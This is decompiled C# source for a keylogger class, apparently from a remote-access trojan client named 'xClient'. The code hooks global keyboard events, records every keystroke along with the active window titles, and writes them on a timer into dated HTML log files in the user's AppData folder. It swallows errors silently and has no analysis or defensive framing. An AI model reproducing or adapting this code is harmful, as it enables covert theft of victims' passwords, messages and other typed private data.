using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Timers;
using System.Windows.Forms;
using xClient.Core.MouseKeyHook;

namespace xClient.Core.Utilities
{
	// Token: 0x020000E1 RID: 225
	public class Keylogger : IDisposable
	{
		// Token: 0x17000116 RID: 278
		// (get) Token: 0x060005AA RID: 1450 RVA: 0x00004B38 File Offset: 0x00002D38
		// (set) Token: 0x060005AB RID: 1451 RVA: 0x00004B40 File Offset: 0x00002D40
		public bool IsDisposed { get; private set; }

		// Token: 0x17000117 RID: 279
		// (get) Token: 0x060005AC RID: 1452 RVA: 0x00004B49 File Offset: 0x00002D49
		public static string LogDirectory
		{
			get
			{
				return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Logs\\";
			}
		}

		// Token: 0x060005AD RID: 1453 RVA: 0x00013EE0 File Offset: 0x000120E0
		public Keylogger(double flushInterval)
		{
			Keylogger.Instance = this;
			this._lastWindowTitle = string.Empty;
			this._logFileBuffer = new StringBuilder();
			this.Subscribe(Hook.GlobalEvents());
			this._timerFlush = new System.Timers.Timer
			{
				Interval = flushInterval
			};
			this._timerFlush.Elapsed += this.timerFlush_Elapsed;
			this._timerFlush.Start();
			this.WriteFile();
		}

		// Token: 0x060005AE RID: 1454 RVA: 0x00004B5C File Offset: 0x00002D5C
		public void Dispose()
		{
			this.Dispose(true);
			GC.SuppressFinalize(this);
		}

		// Token: 0x060005AF RID: 1455 RVA: 0x00004B6B File Offset: 0x00002D6B
		protected virtual void Dispose(bool disposing)
		{
			if (!this.IsDisposed)
			{
				if (disposing && this._timerFlush != null)
				{
					this._timerFlush.Stop();
					this._timerFlush.Dispose();
				}
				this.Unsubscribe();
				this.IsDisposed = true;
			}
		}

		// Token: 0x060005B0 RID: 1456 RVA: 0x00013F6C File Offset: 0x0001216C
		private void Subscribe(IKeyboardMouseEvents events)
		{
			this._mEvents = events;
			this._mEvents.KeyDown += this.OnKeyDown;
			this._mEvents.KeyUp += this.OnKeyUp;
			this._mEvents.KeyPress += this.OnKeyPress;
		}

		// Token: 0x060005B1 RID: 1457 RVA: 0x00013FC8 File Offset: 0x000121C8
		private void Unsubscribe()
		{
			if (this._mEvents == null)
			{
				return;
			}
			this._mEvents.KeyDown -= this.OnKeyDown;
			this._mEvents.KeyUp -= this.OnKeyUp;
			this._mEvents.KeyPress -= this.OnKeyPress;
			this._mEvents.Dispose();
		}

		// Token: 0x060005B2 RID: 1458 RVA: 0x00014030 File Offset: 0x00012230
		private void OnKeyDown(object sender, KeyEventArgs e)
		{
			string text = GClass28.smethod_7();
			if (!string.IsNullOrEmpty(text) && text != this._lastWindowTitle)
			{
				this._lastWindowTitle = text;
				this._logFileBuffer.Append(string.Concat(new string[]
				{
					"<p class=\"h\"><br><br>[<b>",
					text,
					" - ",
					DateTime.Now.ToString("HH:mm"),
					"</b>]</p><br>"
				}));
			}
			if (this._pressedKeys.smethod_0() && !this._pressedKeys.Contains(e.KeyCode))
			{
				this._pressedKeys.Add(e.KeyCode);
				return;
			}
			if (!e.KeyCode.smethod_3() && !this._pressedKeys.Contains(e.KeyCode))
			{
				this._pressedKeys.Add(e.KeyCode);
			}
		}

		// Token: 0x060005B3 RID: 1459 RVA: 0x00014110 File Offset: 0x00012310
		private void OnKeyPress(object sender, KeyPressEventArgs e)
		{
			if (this._pressedKeys.smethod_0() && this._pressedKeys.smethod_2(e.KeyChar))
			{
				return;
			}
			if ((!this._pressedKeyChars.Contains(e.KeyChar) || !GClass28.smethod_4(this._pressedKeyChars, e.KeyChar)) && !this._pressedKeys.smethod_2(e.KeyChar))
			{
				string value = GClass28.smethod_5(e.KeyChar);
				if (!string.IsNullOrEmpty(value))
				{
					if (this._pressedKeys.smethod_0())
					{
						this._ignoreSpecialKeys = true;
					}
					this._pressedKeyChars.Add(e.KeyChar);
					this._logFileBuffer.Append(value);
				}
			}
		}

		// Token: 0x060005B4 RID: 1460 RVA: 0x00004BA3 File Offset: 0x00002DA3
		private void OnKeyUp(object sender, KeyEventArgs e)
		{
			this._logFileBuffer.Append(this.HighlightSpecialKeys(this._pressedKeys.ToArray()));
			this._pressedKeyChars.Clear();
		}

		// Token: 0x060005B5 RID: 1461 RVA: 0x000141C0 File Offset: 0x000123C0
		private string HighlightSpecialKeys(Keys[] keys)
		{
			if (keys.Length < 1)
			{
				return string.Empty;
			}
			string[] array = new string[keys.Length];
			for (int i = 0; i < keys.Length; i++)
			{
				if (!this._ignoreSpecialKeys)
				{
					array[i] = GClass28.smethod_6(keys[i], false);
				}
				else
				{
					array[i] = string.Empty;
					this._pressedKeys.Remove(keys[i]);
				}
			}
			this._ignoreSpecialKeys = false;
			if (this._pressedKeys.smethod_0())
			{
				StringBuilder stringBuilder = new StringBuilder();
				int num = 0;
				for (int j = 0; j < array.Length; j++)
				{
					this._pressedKeys.Remove(keys[j]);
					if (!string.IsNullOrEmpty(array[j]))
					{
						stringBuilder.AppendFormat((num == 0) ? "<p class=\"h\">[{0}" : " + {0}", array[j]);
						num++;
					}
				}
				if (num > 0)
				{
					stringBuilder.Append("]</p>");
				}
				return stringBuilder.ToString();
			}
			StringBuilder stringBuilder2 = new StringBuilder();
			for (int k = 0; k < array.Length; k++)
			{
				this._pressedKeys.Remove(keys[k]);
				if (!string.IsNullOrEmpty(array[k]))
				{
					string a;
					if ((a = array[k]) != null)
					{
						if (a == "Return")
						{
							stringBuilder2.Append("<p class=\"h\">[Enter]</p><br>");
							goto IL_153;
						}
						if (a == "Escape")
						{
							stringBuilder2.Append("<p class=\"h\">[Esc]</p>");
							goto IL_153;
						}
					}
					stringBuilder2.Append("<p class=\"h\">[" + array[k] + "]</p>");
				}
				IL_153:;
			}
			return stringBuilder2.ToString();
		}

		// Token: 0x060005B6 RID: 1462 RVA: 0x00004BCD File Offset: 0x00002DCD
		private void timerFlush_Elapsed(object sender, ElapsedEventArgs e)
		{
			if (this._logFileBuffer.Length > 0 && !GClass0.Disconnect)
			{
				this.WriteFile();
			}
		}

		// Token: 0x060005B7 RID: 1463 RVA: 0x00014338 File Offset: 0x00012538
		private void WriteFile()
		{
			bool flag = false;
			string path = Keylogger.LogDirectory + DateTime.Now.ToString("MM-dd-yyyy");
			try
			{
				if (!Directory.Exists(Keylogger.LogDirectory))
				{
					Directory.CreateDirectory(Keylogger.LogDirectory);
				}
				if (!File.Exists(path))
				{
					flag = true;
				}
				using (FileStream fileStream = new FileStream(path, FileMode.Append, FileAccess.Write))
				{
					using (StreamWriter streamWriter = new StreamWriter(fileStream))
					{
						try
						{
							if (flag)
							{
								streamWriter.WriteLine("<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />Log created on " + DateTime.Now.ToString("dd.MM.yyyy HH:mm") + "<br><br>");
								streamWriter.WriteLine("<style>.h { color: 0000ff; display: inline; }</style>");
								if (this._logFileBuffer.Length > 0)
								{
									streamWriter.Write(this._logFileBuffer);
								}
								this._lastWindowTitle = string.Empty;
							}
							else
							{
								streamWriter.Write(this._logFileBuffer);
							}
						}
						catch
						{
						}
					}
				}
			}
			catch
			{
			}
			this._logFileBuffer = new StringBuilder();
		}

		// Token: 0x040002A1 RID: 673
		public static Keylogger Instance;

		// Token: 0x040002A2 RID: 674
		private readonly System.Timers.Timer _timerFlush;

		// Token: 0x040002A3 RID: 675
		private StringBuilder _logFileBuffer;

		// Token: 0x040002A4 RID: 676
		private List<Keys> _pressedKeys = new List<Keys>();

		// Token: 0x040002A5 RID: 677
		private List<char> _pressedKeyChars = new List<char>();

		// Token: 0x040002A6 RID: 678
		private string _lastWindowTitle;

		// Token: 0x040002A7 RID: 679
		private bool _ignoreSpecialKeys;

		// Token: 0x040002A8 RID: 680
		private IKeyboardMouseEvents _mEvents;
	}
}
